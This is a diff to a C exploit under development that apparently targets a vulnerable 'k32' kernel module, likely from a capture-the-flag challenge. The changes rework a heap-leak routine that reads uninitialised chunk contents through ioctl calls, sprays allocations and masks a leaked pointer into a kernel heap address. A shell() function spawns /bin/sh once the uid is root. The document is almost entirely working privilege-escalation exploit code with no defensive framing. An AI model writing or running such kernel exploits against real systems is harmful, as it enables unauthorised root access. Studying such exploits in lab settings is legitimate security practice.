@@ -5,6 +5,7 @@
 #include <unistd.h>
 #include <sys/ioctl.h>
 #include <stdlib.h>
+#include <string.h>
 #include <sys/wait.h>
 #include <sys/stat.h>
 #include <stdint.h>
@@ -31,6 +32,9 @@ typedef struct{
 
 char buf[48];
 
+unsigned long heap;
+unsigned long base;
+
 void shell(){
     if(!getuid()){
         system("/bin/sh");
@@ -40,13 +44,27 @@ void shell(){
     }
 }
 
-// Function that will hexdump the buffer
-void print_buf(unsigned long *buf, unsigned n){
-    for (int i = 0; i < n; i++){
-        printf("%u: %lx\n", i, buf[i]);
+
+void print_buf(void *buf, uint32_t len){
+    printf("\n[i] Dumping %d bytes.\n\n", len);
+
+    for (int i = 0; i < len; i += 0x10){
+        printf("ADDR[%d, 0x%x]:\t%016lx: 0x", i / 0x8, i, (unsigned long)(buf + i)); 
+
+        for (int j = 7; j >= 0; j--){
+            printf("%02x", *(unsigned char*)(buf + i + j));
+        }
+
+        printf(" - 0x");
+
+        for (int j = 7; j>= 0; j--){
+            printf("%02x", *(unsigned char*)(buf + i + j + 8));
+        }
+
+        puts("");
+
     }
 }
-
 
 uint64_t u64(uint8_t *buf)
 {
@@ -68,6 +86,7 @@ int k32_create(int fd, int idx, int size){
     req->idx = idx;
     
     int res = ioctl(fd, K32_CREATE, req);
+    free(req);
 
     if (res < 0){
         perror("ioctl");
@@ -80,7 +99,8 @@ int k32_create(int fd, int idx, int size){
     return 0;
 }
 
-char *k32_read(int fd, int idx, int size){
+//char *k32_read(int fd, int idx, int size){
+unsigned long *k32_read(int fd, int idx, int size){
 
 
     char *read_buf = malloc(size);
@@ -88,8 +108,11 @@ char *k32_read(int fd, int idx, int size){
 
     req->buf = read_buf;
     req->idx = idx;
+    req->size = size;
 
     int res = ioctl(fd, K32_READ, req);
+
+    free(req);
 
     if (res < 0){
         perror("ioctl");
@@ -106,7 +129,7 @@ char *k32_read(int fd, int idx, int size){
 
     printf("\n");
 
-    return read_buf;
+    return (unsigned long*)read_buf;
 }
 
 int k32_delete(int fd, int idx){
@@ -115,6 +138,8 @@ int k32_delete(int fd, int idx){
     req->idx = idx;
 
     int res = ioctl(fd, K32_DELETE, req);
+
+    free(req);
 
     if (res < 0){
         perror("ioctl");
@@ -128,23 +153,27 @@ int k32_delete(int fd, int idx){
 
 
 unsigned long leak_heap(){
-    char *dump = malloc(0x20);
 
     k32_create(fd,0,0xff);
-    dump = k32_read(fd,0,0x20);
 
-    ///*
-    for (int i = 0; i < 4; i++){
-        k32_create(fd,i,0xee);
-    }
-    //*/
+    unsigned long *dump;
+    unsigned long *dump2;
+    unsigned long heap;
 
-    print_buf((unsigned long*)dump,10);
-
-
-    printf("[*] Leaked heap 0x%lx\n", (dump[2] & 0xfffffffffffff000));
-    printf("[*] Leaked heap 0x%lx\n", (dump[2] & 0x000));
     
+    dump = k32_read(fd,0,0x30);
+
+    for (int i = 1; i < 6; i++){
+        k32_create(fd,i,0xff);
+    }
+
+
+    print_buf((unsigned long*)dump,0x30);
+
+    heap = (dump[2] & 0xfffffffffffff000);
+    printf("[*] Leaked heap 0x%lx\n", (dump[2] & 0xfffffffffffff000));
+    
+    return heap;
 }
 
 int main(void){
@@ -155,24 +184,7 @@ int main(void){
         return 1;
     }   
 
-    leak_heap();
-    /*
-    for (int i = 0; i < 10; i++){
-        k32_create(fd,i,0x30);
-    }
-    */
-    
-    /*
-    for (int i = 2; i < 7; i++){
-        k32_delete(fd,i);
-    }
-
-
-    for (int i = 0; i < 10; i++){
-        k32_read(fd,i,0x30);
-    }
-    */
-
+    heap = leak_heap();
     
     return 0;
 }
